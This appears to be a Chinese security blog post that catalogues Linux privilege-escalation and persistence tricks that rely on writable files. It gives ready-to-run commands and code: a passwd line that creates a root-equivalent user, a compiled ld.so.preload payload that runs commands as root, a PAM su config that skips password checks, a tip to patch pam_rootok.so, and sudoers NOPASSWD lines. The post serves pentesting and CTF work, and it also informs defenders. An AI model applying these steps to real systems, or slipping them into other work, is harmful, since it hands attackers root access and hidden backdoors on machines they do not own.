---
layout: post
title:  "操作 linux 文件提权"
date:   2021-11-20 16:00:01 +0800
categories: Unix
---

* content
{:toc}



### 0x00 前言
--------------------

目前基本年更，工作中的太多东西不太敢放到博客中了，就是平时随手放笔记里的东西可能会拿出来更新一下。

本篇博客主要是总结 Linux 上通过写文件或者类似行为来提权的方法，收集途径来自于笔者平时收集和工作遇到的情况，如有缺失还请指正。

本文~~应该会~~持续更新。

### 0x01 三板斧
-------------------

为了对一些刚入门的小兄弟友好一点，把老生常谈的几种方式在这里提一下。

1. authorized_keys 
2. crontab 文件
3. webshell

这三种方式可以在大部分其他提权相关的文章中见到，这里就不再赘述具体的操作方法，就关键的地方提一下：

>authorized_keys

这个方式需要存在当前用户的 .ssh 目录，同时如果还需要开启 ssh 服务，限制挺多的。

>cron 文件

共有两个文件 `/etc/crontab` 和 `/var/spool/cron/crontabs/root` ，打 redis 的时候用得比较多，但需要注意的是不同的发行版对于crontab文件的权限和格式要求不一样，

所以有时候渗透的时候会发现，ubuntu的发行版通过redis写crontab就经常利用不成功，因为ubuntu的要求权限是600才会执行，但是 centos/redhat 就不用。

>webshell 

这个我感觉是用得越来越少了，当然某些情况下还是可以用的，就不多涉及了。

### 0x02 passwd 和 shadow
--------------------

这两个文件放在一起，这个方法与其说是用来提权，其实更像是维持权限的一种方式。

passwd 这个方式是我在某个脏牛的exp脚本里学到的，如下

```
perl -e "print crypt('kali@12', 'AA')"
echo "kali:AAvV8CAFWw4Bc:0:0:kali:/root:/bin/bash" >> /etc/passwd
```
这样之后 su kali 就可以直接登录 kali 用户了，kali 用户的 id 为0，也就相当于 root 用户。

shadow 就更容易理解了，直接替换某个用户的 hash。

### 0x03 /etc/ld.so.preload 
-------------------------------

在网上经常能搜到关于 LD_PRELOAD 提权或者后门的消息，但是少有提及到 ld.so.preload 文件的利用。

这两者的区别主要是，前者是全局的，对于整个系统都生效，而后者只对于当前用户和环境才生效。

从描述上来看，明显是前者更能满足我们的需求，光写入文件，不用配其他属性就能实现提权，简直完美。

修改 `/etc/ld.so.preload` 文件为：

```
/tmp/preload.so
```

preload.so 的源代码为：

```
// preload.c

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init(void) {
        if(geteuid() != 0){
                exit(0);
        }
        unsetenv("LD_PRELOAD");
        unlink("/etc/ld.so.preload"); //Delete it once called.
        setgid(0);
        setuid(0);
        //system("/usr/bin/chown root:root /tmp/runbash; /usr/bin/chmod +s,ugo+x /tmp/runbash");
	system("/usr/bin/id > /tmp/pwn");
}
```
编译该源码：
```
gcc -fPIC -shared -o preload.so preload.c -nostartfiles -ldl 
```
这样我们就能以 root 权限执行命令了，源码中为了避免反复执行命令，主动删除了 preload 文件，只需要执行一次就够了， 如果没有这行，将会导致灾难性后果。

我在某次CTF比赛中，用这个提权方式成功拿到 flag。只要有任意文件写入，都能用该方式提权。


### 0x04 PAM 认证

PAM 是 Linux 里负责认证的模块，具体的配置在 `/etc/pam.d/` 目录下，其中 su 的配置为 `/etc/pam.d/su`，其他程序的配置为同名配置文件。



#### 1. 配置文件

我们可以通过修改或者覆盖该配置文件来实现提权，不用密码也能切换到root账号。

`/etc/pam.d/su` kali 上测试通过

```
auth            sufficient      pam_permit.so
session       required   pam_env.so readenv=1 envfile=/etc/default/locale

session    optional   pam_mail.so nopen
session    required   pam_limits.so

@include common-auth
@include common-account
@include common-session
```

`pam_permit.so` 的结果是始终返回 True，sufficient 的条件一旦被满足，则直接返回认证成功。

因此上述配置可以实现任意账户切换都成功，不需要密码。


#### 2. pam_rootok.so 库文件

这个 so 库文件在很多程序中都用到了，本来的意义是当 root 用户切换到其他用户时，不需要认证可以直接切换。 当我们有权限可以修改这个库文件时，可以重新生成一个so文件，让它始终返回真就可实现提权。

pam_rootok.so 的源代码在 https://github.com/linux-pam/linux-pam/tree/master/modules/pam_rootok 

验证是否为 root 的关键代码如下：

```
static int
check_for_root (pam_handle_t *pamh, int ctrl)
{
    int retval = PAM_AUTH_ERR;

    if (getuid() == 0)
#ifdef WITH_SELINUX
      if (selinux_check_root() == 0 || security_getenforce() == 0)
#endif
	retval = PAM_SUCCESS;

    if (ctrl & PAM_DEBUG_ARG) {
       pam_syslog(pamh, LOG_DEBUG, "root check %s",
	          (retval==PAM_SUCCESS) ? "succeeded" : "failed");
    }

    return retval;
}
```

将返回值修改为 `return PAM_SUCCESS` 即可实现我们的目标。

完整代码和编译见仓库： https://github.com/Green-m/pam_privilege





### 0x05 /etc/cron.hourly/
------------------------------

大家看标题应该就知道这个方法了，为什么单独把这个拿出来讲，因为这个对格式的要求没那么高。

这个在 cron.hourly 文件夹内可以直接写 shell 脚本或者其他二进制，对文件的格式要求没那么高，但是要有 execute 权限。

因为在这几个文件夹内是用 `run-parts` 程序去调用该文件夹下的文件并执行，和 crontab 文件调用执行的原理并不同。

因为它是时间触发的，最快也需要一个小时触发一次，所以网上用这个方式提权或者执行命令的并不多，但在某些场景下是能用到的。



### 0x06 sudoers
----------------------------

执行命令

```
echo 'lowprivuser ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
```
这样 lowprivuser 就可以不用密码执行 sudo 命令了。


在测试中，我还发现 sudo 还包含了 /etc/sudoers.d/ 文件夹内的所有配置文件，那么理论上生成一个新文件也是可以的

```
echo 'lowprivuser ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers.d/lowprivuser
```

但是测试过程中发现 sudo 会检查该文件的权限，要求不能是全局可写，否则会提示：
```
sudo: /etc/sudoers.d/lowprivuser is world writable
```

那么这个最高的权限就是 776，只要满足这个条件就能够正常使用。


### 0xff 总结

大体上就这样，不是什么特别有用的方法，但某些时刻可能有特别的效果。














